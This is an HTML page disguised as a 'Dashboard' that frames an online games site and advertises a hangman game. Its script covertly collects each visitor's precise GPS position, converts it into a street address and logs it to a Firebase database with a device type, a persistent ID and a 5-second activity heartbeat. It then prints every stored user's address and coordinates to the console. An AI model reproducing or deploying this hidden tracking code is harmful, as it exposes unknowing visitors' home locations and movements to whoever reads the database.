<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Dashboard</title>
  <link rel="icon" type="image/x-icon" href="https://du11hjcvx0uqb.cloudfront.net/dist/images/favicon-e10d657a73.ico" />
  <style>
    html, body { margin: 0; padding: 0; height: 100%; }
    iframe { width: 100%; height: 100%; border: none; }
  </style>
</head>

<body>
  <iframe src="https://niamco.github.io/macvg"></iframe>

  <div id="gamePopup" style="position:fixed;top:50%;left:50%;transform:translate(-50%,-50%) scale(0);background:#fbbf24;padding:40px;border-radius:20px;text-align:center;transition:0.3s;opacity:0;">
    <h1>🎉 New Game Alert! 🎉</h1>
    <h2>Online Hangman</h2>
    <p>Try to guess the word before the hangman is complete.</p>
    <a href="https://niamco.github.io/onlinehangman" target="_blank">Play</a><br><br>
    <button id="closePopup">Close</button>
  </div>

<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/12.11.0/firebase-app.js";
import {
  getFirestore, doc, setDoc, getDoc, updateDoc, increment,
  collection, getDocs
} from "https://www.gstatic.com/firebasejs/12.11.0/firebase-firestore.js";

// ---------- FIREBASE ----------
const firebaseConfig = {
  apiKey: "AIzaSyDGsf7-Gz4QDO-5EqxPLD_TUzyLyavRedQ",
  authDomain: "macvg-analytics.firebaseapp.com",
  projectId: "macvg-analytics",
  storageBucket: "macvg-analytics.firebasestorage.app",
  messagingSenderId: "976855922439",
  appId: "1:976855922439:web:e091863ce7174587db77a2"
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

// ---------- USER ----------
const uid = localStorage.uid || (localStorage.uid = crypto.randomUUID());

// ---------- DEVICE ----------
function getDevice() {
  if (/mobile/i.test(navigator.userAgent)) return "Mobile";
  if (/tablet/i.test(navigator.userAgent)) return "Tablet";
  return "Desktop";
}

// ---------- GPS + ADDRESS ----------
async function getPreciseLocation() {
  return new Promise((resolve) => {
    if (!navigator.geolocation) {
      resolve({ address: "Not supported" });
      return;
    }

    navigator.geolocation.getCurrentPosition(
      async (pos) => {
        const lat = pos.coords.latitude;
        const lon = pos.coords.longitude;

        try {
          const res = await fetch(
            `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`
          );
          const data = await res.json();

          const shortAddress = data.display_name
            ? data.display_name.split(",").slice(0, 3).join(",")
            : "Unknown";

          resolve({
            lat,
            lon,
            address: shortAddress
          });
        } catch {
          resolve({ lat, lon, address: "Lookup failed" });
        }
      },
      () => resolve({ address: "Permission denied" }),
      {
        enableHighAccuracy: true,
        timeout: 10000,
        maximumAge: 0
      }
    );
  });
}

// ---------- HEARTBEAT ----------
setInterval(async () => {
  try {
    await updateDoc(doc(db, "users", uid), {
      lastActive: Date.now()
    });
  } catch {}
}, 5000);

// ---------- MAIN ----------
async function run() {
  console.clear();

  const userRef = doc(db, "users", uid);
  const location = await getPreciseLocation();

  const snap = await getDoc(userRef);

  if (!snap.exists()) {
    await setDoc(userRef, {
      visits: 1,
      device: getDevice(),
      address: location.address,
      lat: location.lat || null,
      lon: location.lon || null,
      firstSeen: Date.now(),
      lastActive: Date.now()
    });
  } else {
    await updateDoc(userRef, {
      visits: increment(1),
      lastActive: Date.now()
    });
  }

  renderDashboard();
}

// ---------- INSANE CONSOLE ----------
async function renderDashboard() {
  const usersSnap = await getDocs(collection(db, "users"));
  const now = Date.now();

  let online = 0;

  console.log("%c🚀 MACVG ANALYTICS CONTROL PANEL", "color:#00ffcc;font-size:20px;font-weight:bold;");
  console.log("══════════════════════════════════════");

  let i = 1;

  usersSnap.forEach(docSnap => {
    const u = docSnap.data();
    const isOnline = now - (u.lastActive || 0) < 30000;

    if (isOnline) online++;

    console.groupCollapsed(
      `%c👤 user${i} ${isOnline ? "🟢 ONLINE" : "⚫ OFFLINE"}`,
      `color:${isOnline ? "#00ff99" : "#888"};font-weight:bold;`
    );

    console.log("🆔 ID:", docSnap.id);
    console.log("📍 Address:", u.address);
    console.log("🌐 Coords:", u.lat, u.lon);
    console.log("📱 Device:", u.device);
    console.log("🔁 Visits:", u.visits);
    console.log("⏱ Last Active:", new Date(u.lastActive).toLocaleString());

    console.groupEnd();
    i++;
  });

  console.log("══════════════════════════════════════");
  console.log(`🟢 ONLINE: ${online}`);
  console.log(`👥 TOTAL USERS: ${usersSnap.size}`);
}

// ---------- START ----------
window.addEventListener("load", run);
</script>
</body>
</html>
